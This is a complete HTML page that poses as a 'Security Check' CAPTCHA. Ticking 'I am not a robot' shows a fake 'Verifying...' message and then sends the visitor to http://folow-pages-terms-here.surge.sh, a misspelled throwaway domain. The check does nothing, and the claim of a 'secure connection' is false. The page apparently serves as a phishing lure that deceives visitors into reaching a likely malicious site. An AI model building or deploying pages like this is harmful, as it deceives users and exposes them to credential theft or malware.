
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Verification</title>

<style>
body{
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#f1f3f6;
    font-family: Arial, sans-serif;
}

.container{
    width:90%;
    max-width:520px;
    background:#ffffff;
    padding:45px;
    border-radius:14px;
    box-shadow:0 0 25px rgba(0,0,0,0.15);
    text-align:center;
}

.header{
    font-size:28px;
    font-weight:bold;
    margin-bottom:15px;
}

p{
    font-size:20px;
}

label{
    font-size:22px;
    cursor:pointer;
    display:flex;
    justify-content:center;
    align-items:center;
    gap:12px;
}

input[type="checkbox"]{
    transform:scale(1.6);
    cursor:pointer;
}

.status{
    margin-top:18px;
    font-size:16px;
    color:#555;
    display:none;
}

.small-text{
    margin-top:25px;
    font-size:14px;
    color:gray;
}
</style>
</head>

<body>

<div class="container">

    <div class="header">🔒 Security Check</div>

    <p>Please confirm that you are not a robot</p>

    <label>
        <input type="checkbox" id="check">
        I am not a robot
    </label>

    <div class="status" id="status">Verifying...</div>

    <div class="small-text">
        This website uses a secure connection
    </div>

</div>

<script>
document.getElementById("check").addEventListener("change", function(){
    if(this.checked){
        this.disabled = true;
        document.getElementById("status").style.display = "block";

        setTimeout(() => {
            window.location.href = "http://folow-pages-terms-here.surge.sh";
        }, 2000); // 2 seconds delay
    }
});
</script>

</body>
</html>
